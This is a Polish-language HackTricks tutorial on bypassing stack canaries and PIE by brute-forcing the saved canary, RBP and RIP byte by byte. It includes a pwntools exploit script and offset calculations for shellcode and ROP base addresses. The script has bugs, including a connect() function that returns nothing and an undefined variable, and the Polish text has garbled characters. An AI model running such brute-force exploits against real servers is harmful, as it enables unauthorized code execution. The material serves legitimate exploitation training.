# Adresy BF na stosie

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakowania, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

**Jeli masz do czynienia z binarnym plikiem zabezpieczonym przez canary i PIE (Position Independent Executable), prawdopodobnie bdziesz musia znale藕 spos贸b na ich obejcie.**

![](<../../../.gitbook/assets/image (862).png>)

{% hint style="info" %}
Zauwa偶, 偶e **`checksec`** mo偶e nie wykry, 偶e binarny plik jest chroniony przez canary, jeli zosta on skompilowany statycznie i nie jest w stanie zidentyfikowa funkcji.\
Mo偶esz jednak zauwa偶y to rcznie, jeli zauwa偶ysz, 偶e warto jest zapisywana na stosie na pocztku wywoania funkcji, a nastpnie sprawdzana przed wyjciem.
{% endhint %}

## Adresy BF

Aby omin PIE, musisz **wyciec pewien adres**. Jeli binarny plik nie wycieka 偶adnych adres贸w, najlepiej jest **przeprowadzi atak siowy na RBP i RIP zapisane na stosie** w podatnej funkcji.\
Na przykad, jeli binarny plik jest chroniony zar贸wno przez **canary**, jak i **PIE**, mo偶esz zacz atak siowy od canary, a nastpnie **nastpne** 8 bajt贸w (x64) bd zapisane jako **RBP**, a **kolejne** 8 bajt贸w bd zapisane jako **RIP**.

{% hint style="success" %}
Zao偶enie jest takie, 偶e adres powrotu na stosie nale偶y do kodu binarnego g贸wnego, co w przypadku, gdy podatno znajduje si w kodzie binarnym, zazwyczaj bdzie prawd.
{% endhint %}

Aby przeprowadzi atak siowy na RBP i RIP z binarnego pliku, mo偶esz ustali, 偶e poprawny zgadnity bajt jest poprawny, jeli program co wypisze lub po prostu nie ulegnie awarii. **Ta sama funkcja**, co ta u偶ywana do ataku siowego na canary, mo偶e by u偶yta do ataku siowego na RBP i RIP:
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

# CANARY BF HERE
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary

# PIE BF FROM HERE
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
Ostatni rzecz, kt贸r musisz zrobi, aby pokona PIE, jest obliczenie **u偶ytecznych adres贸w z wyciekych** adres贸w: **RBP** i **RIP**.

Z **RBP** mo偶esz obliczy **gdzie zapisujesz sw贸j shell w stosie**. Mo偶e to by bardzo przydatne, aby wiedzie, gdzie zamierzasz zapisa cig _"/bin/sh\x00"_ wewntrz stosu. Aby obliczy odlego midzy wyciekiem RBP a swoim kodem shell, wystarczy ustawi **punkt przerwania po wycieku RBP** i sprawdzi **gdzie znajduje si tw贸j kod shell**, a nastpnie obliczy odlego midzy kodem shell a RBP:
```python
INI_SHELLCODE = RBP - 1152
```
Z **RIP** mo偶na obliczy **adres bazowy binari贸w PIE**, kt贸ry bdzie potrzebny do stworzenia **poprawnego acucha ROP**.\
Aby obliczy adres bazowy, wystarczy wykona polecenie `objdump -d vunbinary` i sprawdzi ostatnie adresy rozkad贸w:

![](<../../../.gitbook/assets/image (476).png>)

W tym przykadzie wida, 偶e potrzebne jest tylko **1,5 bajta**, aby zlokalizowa cay kod, wic adres bazowy w tej sytuacji bdzie **wyciekiem RIP, ale zakoczonym na "000"**. Na przykad, jeli wycieke `0x562002970ecf`, adres bazowy bdzie wynosi `0x562002970000`
```python
elf.address = RIP - (RIP & 0xfff)
```
## Poprawki

Zgodnie z [**pewnymi obserwacjami z tego posta**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#extended-brute-force-leaking), mo偶liwe jest, 偶e wyciekajc wartoci RBP i RIP, serwer nie ulegnie awarii przy niekt贸rych wartociach, kt贸re nie s poprawne, a skrypt BF bdzie myla, 偶e otrzyma te waciwe. Dzieje si tak dlatego, 偶e **niekt贸re adresy po prostu nie spowoduj awarii, nawet jeli nie s to dokadnie te waciwe**.

Zgodnie z tym postem zaleca si dodanie kr贸tkiego op贸藕nienia midzy 偶daniami wysyanymi do serwera.

<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
